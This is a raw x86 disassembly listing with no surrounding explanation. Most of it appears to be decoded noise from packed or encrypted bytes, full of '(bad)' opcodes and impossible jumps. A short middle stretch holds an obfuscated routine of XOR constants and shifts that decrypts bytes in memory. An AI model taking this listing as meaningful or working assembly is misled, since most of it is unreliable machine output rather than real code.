  40934e:	add    eax,0x733f564c
  409353:	sub    al,0x3c
  409355:	test   al,0xaa
  409357:	mov    ah,0x98
  409359:	adc    eax,0xe0741e2f
  40935e:	pop    edx
  40935f:	scas   al,BYTE PTR es:[edi]
  409360:	push   es
  409361:	mov    esp,0x15c8e54d
  409366:	sbb    dh,BYTE PTR [ebx-0x7e]
  409369:	xchg   ebp,ecx
  40936b:	add    eax,0xbd455ec2
  409370:	iret   
  409371:	fiadd  WORD PTR [ebx-0x45a326f0]
  409377:	ficom  DWORD PTR [edx]
  409379:	in     al,dx
  40937a:	add    esp,DWORD PTR [eax]
  40937c:	xchg   BYTE PTR [edx+edi*2],dh
  40937f:	push   esi
  409380:	arpl   WORD PTR [edi-0x20a63889],bp
  409386:	(bad)  
  409387:	mov    edi,?
  409389:	mov    esi,DWORD PTR [edx]
  40938b:	ins    BYTE PTR es:[edi],dx
  40938c:	loop   0x4093f4
  40938e:	fadd   DWORD PTR [edi-0x5e976e3f]
  409394:	mov    eax,0xc3ab2958
  409399:	aam    0x54
  40939b:	jmp    0xf75ee96f
  4093a0:	push   cs
  4093a1:	mov    al,0x86
  4093a3:	loopne 0x409335
  4093a5:	pop    es
  4093a6:	inc    ebp
  4093a7:	xchg   edi,eax
  4093a8:	mov    ds:0xd776d841,eax
  4093ad:	jl     0x409395
  4093af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093b0:	loope  0x4093ab
  4093b2:	mov    BYTE PTR [ebx],ah
  4093b4:	addr16 pop es
  4093b6:	and    BYTE PTR [ebx],al
  4093b8:	xchg   ecx,eax
  4093b9:	cmp    DWORD PTR [edi-0x7e],eax
  4093bc:	(bad)  
  4093bd:	xchg   edx,eax
  4093be:	(bad)  
  4093bf:	(bad)  
  4093c0:	and    al,0xaf
  4093c2:	sbb    al,0x35
  4093c4:	mov    edi,0x45b3388b
  4093c9:	cld    
  4093ca:	daa    
  4093cb:	sub    DWORD PTR [ebx-0x4cea3286],edx
  4093d1:	aas    
  4093d2:	loopne 0x409425
  4093d4:	adc    al,dl
  4093d6:	mov    ch,0x25
  4093d8:	cdq    
  4093d9:	pusha  
  4093da:	mov    ds:0x5e6152cc,al
  4093df:	sbb    BYTE PTR [edi-0x50],cl
  4093e2:	xchg   edi,eax
  4093e3:	lods   eax,DWORD PTR ds:[esi]
  4093e4:	adc    DWORD PTR [ebp*8-0x59a8faf4],edi
  4093eb:	sbb    BYTE PTR [ebp+0x7b],bl
  4093ee:	or     ch,cl
  4093f0:	call   0xd255474f
  4093f5:	fiadd  WORD PTR [eax]
  4093f7:	ja     0x40943e
  4093f9:	stos   BYTE PTR es:[edi],al
  4093fa:	into   
  4093fb:	icebp  
  4093fc:	and    ebp,DWORD PTR [edx+edx*4-0x22]
  409400:	fst    DWORD PTR [ecx+0x7fff71a3]
  409406:	rol    DWORD PTR [ecx-0x281ad8b3],1
  40940c:	mov    ebp,0x5b701b61
  409411:	xor    DWORD PTR [ecx+0x7332cb16],ebp
  409417:	mov    WORD PTR [esi-0x86f22ed],fs
  40941d:	sbb    DWORD PTR [ecx],edx
  40941f:	or     bl,dl
  409421:	mov    WORD PTR [edx],ds
  409423:	cmp    ah,0x1d
  409426:	and    BYTE PTR [ecx+0x32],bh
  409429:	lea    ebp,[ebx+0x48]
  40942c:	aam    0xe9
  40942e:	inc    edi
  40942f:	jmp    0x88b54b14
  409434:	aas    
  409435:	outs   dx,DWORD PTR ds:[esi]
  409436:	xchg   edx,eax
  409437:	icebp  
  409438:	or     al,0x8e
  40943a:	out    0xfe,eax
  40943c:	int3   
  40943d:	mov    eax,ds:0xf1ed2ceb
  409442:	pop    ebp
  409443:	cmp    dl,dl
  409445:	push   cs
  409446:	and    esi,DWORD PTR [esi-0x73a7fee7]
  40944c:	xor    DWORD PTR [edi-0x6b144d39],esi
  409452:	std    
  409453:	mov    ds:0x7e64927c,al
  409458:	in     al,dx
  409459:	sbb    BYTE PTR [esp+esi*1],ch
  40945c:	jg     0x40948b
  40945e:	xor    eax,0x5fa801fd
  409463:	xchg   edi,eax
  409464:	stos   BYTE PTR es:[edi],al
  409465:	cdq    
  409466:	ja     0x4094e5
  409468:	loope  0x40947c
  40946a:	imul   edx,ebp,0xffffffa9
  40946d:	les    ecx,FWORD PTR [ebp-0x25350613]
  409473:	cmp    ecx,DWORD PTR [ecx]
  409475:	int3   
  409476:	and    al,0x2e
  409478:	jmp    0x4094c1
  40947a:	test   eax,0xe3765acd
  40947f:	lahf   
  409480:	fwait
  409481:	sub    ecx,0xb2bce8b5
  409487:	pop    DWORD PTR [eax+eiz*8]
  40948a:	xchg   edi,eax
  40948b:	stos   DWORD PTR es:[edi],eax
  40948c:	add    eax,0xcd09591d
  409491:	scas   eax,DWORD PTR es:[edi]
  409492:	cmp    dl,al
  409494:	gs cli 
  409496:	or     ah,BYTE PTR [eax-0x3b0899d8]
  40949c:	sbb    eax,0x796c4db3
  4094a1:	jg     0x409429
  4094a3:	xor    eax,edi
  4094a5:	(bad)  
  4094a6:	out    dx,eax
  4094a7:	xchg   ebx,eax
  4094a8:	(bad)  
  4094a9:	sbb    eax,0xb4df1692
  4094ae:	sub    al,0x62
  4094b0:	imul   edi,DWORD PTR [ecx-0x4f674ac6],0x37
  4094b7:	push   0x6d
  4094b9:	pop    esp
  4094ba:	popf   
  4094bb:	stc    
  4094bc:	inc    ebp
  4094bd:	add    BYTE PTR [edx+eax*4-0x5a],al
  4094c1:	retf   
  4094c2:	int    0xaf
  4094c4:	jle    0x409470
  4094c6:	(bad)  
  4094c7:	and    ch,ah
  4094c9:	mov    edx,0xafce6759
  4094ce:	out    dx,eax
  4094cf:	or     ah,BYTE PTR [edx+0x3e658c33]
  4094d5:	hlt    
  4094d6:	jbe    0x409509
  4094d8:	test   eax,0xa81c42cf
  4094dd:	cmc    
  4094de:	loopne 0x4094c7
  4094e0:	xchg   esp,eax
  4094e1:	and    BYTE PTR [edi],dl
  4094e3:	fwait
  4094e4:	pop    ds
  4094e5:	aam    0xda
  4094e7:	outs   dx,BYTE PTR ds:[esi]
  4094e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094e9:	retf   0xbf8
  4094ec:	xchg   esi,eax
  4094ed:	mov    edx,0xce0015a5
  4094f2:	xchg   ecx,eax
  4094f3:	xchg   edx,eax
  4094f4:	cli    
  4094f5:	enter  0x2879,0xc6
  4094f9:	jb     0x409528
  4094fb:	inc    ebp
  4094fc:	inc    ecx
  4094fd:	fisub  WORD PTR [esi-0x67a20503]
  409503:	not    DWORD PTR [ecx-0x3c]
  409506:	xchg   edi,eax
  409507:	add    DWORD PTR ds:0x356aaa02,ecx
  40950d:	push   es
  40950e:	jmp    0x3983:0x95c0d6ec
  409515:	cmp    eax,0x454a5af9
  40951a:	jecxz  0x4094d8
  40951c:	mov    esp,ecx
  40951e:	mov    ds:0x482c3096,al
  409523:	and    bl,ah
  409525:	cmc    
  409526:	not    BYTE PTR [ebp-0x36]
  409529:	push   es
  40952a:	test   eax,0x736f0f04
  40952f:	push   edx
  409530:	add    eax,0xdc4439c4
  409535:	(bad)  
  409536:	imul   ecx,DWORD PTR [esi*2-0x1a1b5cda],0xa2b44fd
  409541:	dec    eax
  409542:	aad    0x54
  409544:	cdq    
  409545:	jnp    0x40953c
  409547:	rep stos DWORD PTR es:[edi],eax
  409549:	cmp    eax,0xf8f28f96
  40954e:	pop    eax
  40954f:	jge    0x4095b3
  409551:	repz add eax,0xc60b6528
  409557:	popa   
  409558:	or     cl,dl
  40955a:	pushf  
  40955b:	fdecstp 
  40955d:	push   eax
  40955e:	outs   dx,BYTE PTR ds:[esi]
  40955f:	cmp    al,0xcf
  409561:	add    al,0x47
  409563:	data16 test al,0x81
  409566:	jno    0x409525
  409568:	dec    esp
  409569:	bound  eax,QWORD PTR [ebp+0x6d]
  40956c:	push   es
  40956d:	lea    ebp,[eax-0x6b64c09a]
  409573:	dec    eax
  409574:	test   eax,0xe3c3c141
  409579:	std    
  40957a:	(bad)  
  40957b:	popa   
  40957c:	hlt    
  40957d:	push   ebx
  40957e:	jno    0x409553
  409580:	call   0xc0a0b818
  409585:	shl    DWORD PTR [edx+0x6fa69b75],cl
  40958b:	cmp    al,0xd5
  40958d:	dec    eax
  40958e:	lock or esp,DWORD PTR [esi-0x6d]
  409592:	and    DWORD PTR [edx+0x69],ebp
  409595:	and    ecx,DWORD PTR [edx+ebp*1+0x2f]
  409599:	push   ss
  40959a:	cs aad 0x0
  40959d:	mov    al,0xe9
  40959f:	sbb    eax,0xf47bc241
  4095a4:	and    eax,0x415f4e48
  4095a9:	mov    cl,0x34
  4095ab:	adc    ebx,DWORD PTR [edi+eax*1]
  4095ae:	sub    eax,0x7ce8633c
  4095b3:	dec    esi
  4095b4:	ret    0xa53e
  4095b7:	mov    ebp,0xa8a6ce5e
  4095bc:	mov    dh,0x68
  4095be:	(bad)  
  4095bf:	test   DWORD PTR [eax+edi*1-0x70],0x56d8003
  4095c7:	xor    BYTE PTR [ebx],dh
  4095c9:	pop    ss
  4095ca:	std    
  4095cb:	jo     0x409553
  4095cd:	test   BYTE PTR [ecx-0x62155d4f],ch
  4095d3:	inc    edx
  4095d4:	mov    cl,0x3f
  4095d6:	das    
  4095d7:	outs   dx,DWORD PTR ds:[esi]
  4095d8:	inc    esi
  4095d9:	pop    edi
  4095da:	adc    ch,al
  4095dc:	aam    0x2a
  4095de:	or     DWORD PTR [edx-0x1902a84c],eax
  4095e4:	or     esp,DWORD PTR [ebx+0x71]
  4095e7:	mov    DWORD PTR [edx+ebp*4+0x2d060],edi
  4095ee:	jnp    0x4095da
  4095f0:	hlt    
  4095f1:	loop   0x409580
  4095f3:	inc    eax
  4095f4:	repnz imul ebp
  4095f7:	in     eax,dx
  4095f8:	ret    
  4095f9:	das    
  4095fa:	xchg   edi,eax
  4095fb:	cmp    edx,DWORD PTR [edi-0x7ccb86bb]
  409601:	inc    edi
  409602:	pop    ebx
  409603:	push   esi
  409604:	pop    ss
  409605:	dec    esi
  409606:	mov    ebp,DWORD PTR [ebp+0x7f6c9edb]
  40960c:	clc    
  40960d:	fsubr  DWORD PTR [ebp-0x5f685aaa]
  409613:	(bad)  
  409614:	and    eax,0xddba848f
  409619:	dec    edx
  40961a:	push   ebx
  40961b:	(bad)  
  40961c:	out    0xcf,eax
  40961e:	mov    cl,0xe2
  409620:	push   ds
  409621:	leave  
  409622:	push   cs
  409623:	(bad)  [ebp+0x2ac0f90c]
  409629:	inc    eax
  40962a:	inc    ecx
  40962b:	mov    edx,DWORD PTR [esi]
  40962d:	shl    eax,0x2
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x4225d8
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0xfbbca5c6
  4097de:	cwde   
  4097df:	jnp    0x409791
  4097e1:	inc    edi
  4097e2:	inc    ecx
  4097e3:	sbb    BYTE PTR [eax],bl
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    cl,bh
  4097ea:	loopne 0x409793
  4097ec:	das    
  4097ed:	out    0x4a,eax
  4097ef:	fiadd  WORD PTR [esi-0x5b]
  4097f2:	ret    0xf58
  4097f5:	jbe    0x4097a1
  4097f7:	popf   
  4097f8:	push   0x304d7831
  4097fd:	into   
  4097fe:	pushf  
  4097ff:	adc    dh,BYTE PTR [edx-0x34]
  409802:	sar    DWORD PTR [ecx-0x470a3da0],cl
  409808:	ret    
  409809:	daa    
  40980a:	(bad)  
  40980b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40980c:	enter  0x9c5f,0xf
  409810:	sti    
  409811:	mov    edx,DWORD PTR [ecx+0x5e31e897]
  409817:	std    
  409818:	push   ds
  409819:	lock pop DWORD PTR ds:0xaa911647
  409820:	test   al,0x9b
  409822:	call   0x9d8ddf41
  409827:	sbb    ebp,DWORD PTR [ebx+esi*1+0x4b225c45]
  40982e:	gs daa 
  409830:	sti    
  409831:	pop    edi
  409832:	xchg   esi,eax
  409833:	add    DWORD PTR [ecx-0x7f],0xffffff9d
  409837:	jo     0x409826
  409839:	cmp    ch,bl
  40983b:	hlt    
  40983c:	hlt    
  40983d:	test   eax,0xc90b78cb
  409842:	aad    0x3
  409844:	jne    0x4098a5
  409846:	sub    DWORD PTR [eax+0x67844dfa],esi
  40984c:	dec    DWORD PTR [ebp+0x10]
  40984f:	bound  eax,QWORD PTR [esp+ecx*1]
  409852:	std    
  409853:	bound  esp,QWORD PTR [ecx+eax*8+0x2b]
  409857:	ds fs xchg ecx,eax
  40985a:	mov    ah,0xc3
  40985c:	adc    eax,0x14d2b02b
  409861:	aam    0xe6
  409863:	mov    cl,0x24
  409865:	imul   edx,DWORD PTR [ebp+0x4436ff44],0x730292e4
  40986f:	sub    al,0x38
  409871:	mov    ds,WORD PTR fs:[ebx]
  409874:	int3   
  409875:	and    edi,esi
  409877:	ins    BYTE PTR es:[edi],dx
  409878:	pop    ss
  409879:	rcl    DWORD PTR [ebp+0x4c135f5c],0xcb
  409880:	mov    ds:0x30fc5dcb,eax
  409885:	call   0x7c71:0xc02b7eb7
  40988c:	inc    esi
  40988d:	aaa    
  40988e:	mov    DWORD PTR [ebx-0x6fb36c0b],esi
  409894:	aam    0xe4
  409896:	pop    es
  409897:	push   ss
  409898:	push   edi
  409899:	(bad)  
  40989a:	pop    esp
  40989b:	cmp    DWORD PTR [edx],ecx
  40989d:	fist   DWORD PTR [ebp+0x6a91e123]
  4098a3:	ins    DWORD PTR es:[edi],dx
  4098a4:	ins    DWORD PTR es:[edi],dx
  4098a5:	cmp    BYTE PTR [esi],ch
  4098a7:	xor    BYTE PTR [eax-0x4d],bl
  4098aa:	dec    esi
  4098ab:	xchg   ebx,eax
  4098ac:	gs or  eax,0x34e79f9c
  4098b2:	mov    al,BYTE PTR [esi]
  4098b4:	sub    ch,dh
  4098b6:	sub    eax,0xe6e8859
  4098bb:	mov    ah,0xc0
  4098bd:	leave  
  4098be:	loope  0x40990f
  4098c0:	mov    ecx,esi
  4098c2:	xchg   ecx,eax
  4098c3:	push   esi
  4098c4:	outs   dx,DWORD PTR ds:[esi]
  4098c5:	push   ecx
  4098c6:	mov    ch,0xa3
  4098c8:	js     0x40985a
  4098ca:	and    DWORD PTR [esi-0x6cc39ed6],0xffffffe6
  4098d1:	ret    
  4098d2:	cmp    BYTE PTR [ebx-0x7381e6ec],cl
  4098d8:	call   0xa0bbfca8
  4098dd:	mov    WORD PTR [ebx+0x65],?
  4098e0:	and    ebx,edi
  4098e2:	sub    BYTE PTR [edx-0xe47ada9],cl
  4098e8:	adc    edi,DWORD PTR [ebp+0x7d]
  4098eb:	pop    ss
  4098ec:	aad    0xc0
  4098ee:	mov    eax,ds:0x1ce51329
  4098f3:	jnp    0x4098f6
  4098f5:	xchg   esi,eax
  4098f6:	cdq    
  4098f7:	iret   
  4098f8:	cmp    BYTE PTR [ecx-0xd],bl
  4098fb:	mov    ecx,gs
  4098fd:	sar    DWORD PTR [eax-0x154636f],1
  409903:	in     al,0x6e
  409905:	and    ch,BYTE PTR [edi+0x7b]
  409908:	pop    edi
  409909:	ins    BYTE PTR es:[edi],dx
  40990a:	push   bp
  40990c:	ret    
  40990d:	sub    BYTE PTR [eax-0x57fe8d60],cl
  409913:	fcom   DWORD PTR [eax+0x3f]
  409916:	imul   ebp,DWORD PTR [esi+ecx*2-0x3f75d2a],0xffffffa2
  40991e:	adc    al,0xce
  409920:	jl     0x4098c2
  409922:	scas   eax,DWORD PTR es:[edi]
  409923:	aam    0x5c
  409925:	in     eax,dx
  409926:	sti    
  409927:	xchg   BYTE PTR [edx+0x6929ef94],bl
  40992d:	int3   
  40992e:	enter  0xd3e8,0x68
  409932:	ds pop ebx
  409934:	pop    ecx
  409935:	scas   al,BYTE PTR es:[edi]
  409936:	jo     0x409911
  409938:	not    BYTE PTR [ebx]
  40993a:	psllw  mm2,QWORD PTR [ebp-0x5a]
  40993e:	mov    ebx,0xa17dfd74
  409943:	jae    0x40992e
  409945:	dec    edx
  409946:	lods   eax,DWORD PTR ds:[esi]
  409947:	pop    edi
  409948:	ror    esi,1
  40994a:	add    eax,0xb8d25f7c
  40994f:	inc    ebp
  409950:	mov    al,0x67
  409952:	in     al,dx
  409953:	jecxz  0x40995d
  409955:	inc    eax
  409956:	push   esi
  409957:	mov    ebx,ebx
  409959:	mov    ebp,0x1f8aff77
  40995e:	jl     0x4098e6
  409960:	inc    ecx
  409961:	or     dl,ch
  409963:	inc    edx
  409964:	jmp    FWORD PTR [ecx-0x6b]
  409967:	pop    esp
  409968:	into   
  409969:	ret    
  40996a:	sbb    eax,0xc8e2a13c
  40996f:	test   eax,0x36da8918
  409975:	jle    0x409987
  409977:	fsincos 
  409979:	arpl   WORD PTR [ecx+0x5c3841ce],di
  40997f:	gs aad 0x9d
  409982:	pop    ebx
  409983:	jbe    0x409992
  409985:	test   eax,0x39fa1fb3
  40998a:	mov    edi,0x902d820f
  40998f:	les    edx,FWORD PTR [ecx+0x52]
  409992:	cmp    BYTE PTR [ebx+0x46a2648],0x56
  409999:	xchg   esp,eax
  40999a:	push   esi
  40999b:	inc    esi
  40999c:	imul   ebx,edx,0xffffff8b
  40999f:	cmc    
  4099a0:	xor    dl,BYTE PTR [edi-0x1683b9d9]
  4099a6:	outs   dx,BYTE PTR ds:[esi]
  4099a7:	mov    ebx,0x48363390
  4099ac:	add    ecx,DWORD PTR [ebx+edx*1]
  4099af:	xor    DWORD PTR [ecx+0x2977774f],edx
  4099b5:	push   es
  4099b6:	push   ss
  4099b7:	shl    DWORD PTR [edi-0x44],cl
  4099ba:	mov    WORD PTR [ebx+ecx*8-0x28],fs
  4099be:	cdq    
  4099bf:	add    edi,DWORD PTR [edi]
  4099c1:	sub    ecx,DWORD PTR [edi]
  4099c3:	dec    edx
  4099c4:	lahf   
  4099c5:	cld    
  4099c6:	mov    bh,0xeb
  4099c8:	(bad)
  4099cc:	in     al,dx
  4099cd:	xchg   esi,eax
  4099ce:	dec    ebp
  4099cf:	dec    esp
  4099d0:	in     al,dx
  4099d1:	fild   WORD PTR [eax-0x69d519ca]
  4099d7:	jnp    0x40999e
  4099d9:	daa    
  4099da:	pop    esi
  4099db:	xor    BYTE PTR [edi],ch
  4099dd:	aaa    
  4099de:	inc    eax
  4099df:	sbb    BYTE PTR [esi-0x4db26a62],0xd7
  4099e6:	mov    ah,0xc3
  4099e8:	daa    
  4099e9:	(bad)
  4099ec:	call   0x77f6:0x23ebbf82
  4099f3:	xor    DWORD PTR [ebx],ebp
  4099f5:	repnz fnstsw WORD PTR [edi-0x27cad965]
  4099fc:	jbe    0x4099c7
  4099fe:	test   BYTE PTR [eax+0x51b5c200],0xd
  409a05:	dec    eax
  409a06:	imul   edx,DWORD PTR [ecx+0x208760b1],0x3c
  409a0d:	mov    WORD PTR [ecx+0x2c],cs
  409a10:	mov    cl,0xd
  409a12:	dec    esi
  409a13:	outs   dx,BYTE PTR ds:[esi]
  409a14:	pop    esi
  409a15:	(bad)  
  409a16:	mov    ebp,0x8b0c9ba4
  409a1b:	or     DWORD PTR [edi],esp
  409a1d:	inc    eax
  409a1e:	push   ebp
  409a1f:	sar    DWORD PTR [ebx-0x7a4bbf61],0x4b
  409a26:	in     al,dx
  409a27:	aaa    
  409a28:	rcl    bl,cl
  409a2a:	dec    esi
  409a2b:	repz xchg edi,ecx
  409a2e:	lahf   
  409a2f:	(bad)  
  409a30:	lods   al,BYTE PTR ds:[esi]
  409a31:	xchg   edi,eax
  409a32:	imul   ebx,DWORD PTR [ecx-0x2c],0xffffffe5
  409a36:	mov    ds:0x83b8c290,eax
  409a3b:	ins    DWORD PTR es:[edi],dx
  409a3c:	das    
  409a3d:	cmp    esp,esp
  409a3f:	pop    esp
  409a40:	(bad)  
  409a41:	call   DWORD PTR [eax+ecx*2+0x1f982326]
  409a48:	inc    ebx
  409a49:	(bad)  
  409a4b:	adc    edx,DWORD PTR [esi-0x55]
  409a4e:	push   edi
  409a4f:	and    edi,edi
  409a51:	int    0x39
  409a53:	ds in  ax,dx
  409a56:	ds xor eax,eax
  409a59:	push   esp
  409a5a:	icebp  
  409a5b:	push   ebx
  409a5c:	adc    eax,0x525e568b
  409a61:	outs   dx,BYTE PTR ds:[esi]
  409a62:	outs   dx,DWORD PTR ds:[esi]
  409a63:	mov    esp,0xbb68526
  409a68:	mov    DWORD PTR ds:0xb128542c,edi
  409a6e:	fwait
  409a6f:	mov    edx,0x7053ef9e
  409a74:	das    
  409a75:	xor    BYTE PTR [eax],dh
  409a77:	mov    ds:0xaef2525b,al
  409a7c:	leave  
  409a7d:	dec    ebp
  409a7e:	stos   BYTE PTR es:[edi],al
  409a7f:	sti    
  409a80:	cmp    DWORD PTR [ebp-0x787bed56],edx
  409a86:	inc    ecx
  409a87:	cmp    edi,edx
  409a89:	cmc    
  409a8a:	popa   
  409a8b:	sbb    eax,0x5730a3e3
  409a90:	mov    dh,0x78
  409a92:	sti    
  409a93:	fisub  DWORD PTR [esi]
  409a95:	out    dx,eax
  409a96:	sbb    eax,edi
  409a98:	mov    dl,BYTE PTR [ecx+edi*1+0x11]
  409a9c:	pop    esp
  409a9d:	mov    cl,0xc7
  409a9f:	int    0x3e
  409aa1:	xchg   DWORD PTR [ebp+0x3e4965b5],esp
  409aa7:	fcos   
  409aa9:	ret    
  409aaa:	lods   al,BYTE PTR ds:[esi]
  409aab:	mov    bh,0xd4
  409aad:	leave  
  409aae:	pop    ebp
  409aaf:	dec    esi
  409ab0:	hlt    
  409ab1:	add    cl,ah
  409ab3:	sbb    al,0xa6
  409ab5:	jmp    0xc44e:0xe2a6d750
  409abc:	sbb    eax,0xfe05ade0
  409ac1:	sbb    eax,0x5ceccd9b
  409ac6:	adc    al,0x31
  409ac8:	pushf  
  409ac9:	ds scas al,BYTE PTR es:[edi]
  409acb:	test   eax,0x5943672
  409ad0:	push   eax
  409ad1:	xchg   esp,eax
  409ad2:	out    0x35,al
  409ad4:	cmp    eax,0x9cdf70dd
  409ad9:	push   0xffffff9d
  409adb:	add    BYTE PTR [eax],al
  409add:	push   esp
  409ade:	fild   DWORD PTR [esi]
  409ae0:	je     0x409af6
  409ae2:	das    
  409ae3:	and    esi,DWORD PTR [esp+edx*8+0xc]
  409ae7:	pushf  
  409ae8:	data16 stos BYTE PTR es:[edi],al
  409aea:	(bad)  
  409aeb:	push   ecx
  409aec:	mov    ecx,0xbb13a7d8
  409af1:	push   cs
  409af2:	dec    ebp
  409af3:	mov    al,ds:0xaddd6d14
  409af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409af9:	shr    DWORD PTR [esi+0x27],cl
  409afc:	add    edi,esp
  409afe:	sub    al,0x20
  409b00:	xchg   ebx,eax
  409b01:	es xor al,0x41
  409b04:	les    ebp,FWORD PTR [edi+0x641fe530]
  409b0a:	sbb    bl,BYTE PTR [esi]
  409b0c:	xor    BYTE PTR [ebp-0x69],0xfe
  409b10:	ins    BYTE PTR es:[edi],dx
  409b11:	test   DWORD PTR ds:0x818a93fd,ecx
  409b17:	cmc    
  409b18:	outs   dx,DWORD PTR ds:[esi]
  409b19:	dec    esi
  409b1a:	xor    al,0x3a
  409b1c:	ss ja  0x409b9e
  409b1f:	mov    WORD PTR [ecx+esi*2-0x17b2de89],ss
  409b26:	icebp  
  409b27:	push   ss
  409b28:	adc    al,0x44
  409b2a:	aam    0xbf
  409b2c:	lea    edx,[edx-0x778d78]
  409b32:	lds    esi,FWORD PTR [ebx]
  409b34:	fisubr WORD PTR [eax+ebx*2-0x2e]
  409b38:	scas   eax,DWORD PTR es:[edi]
  409b39:	add    ecx,DWORD PTR [eax-0x7f]
  409b3c:	jl     0x409b85
  409b3e:	add    ch,cl
  409b40:	mov    es,ebx
  409b42:	shr    ebp,1
  409b44:	repnz int3 
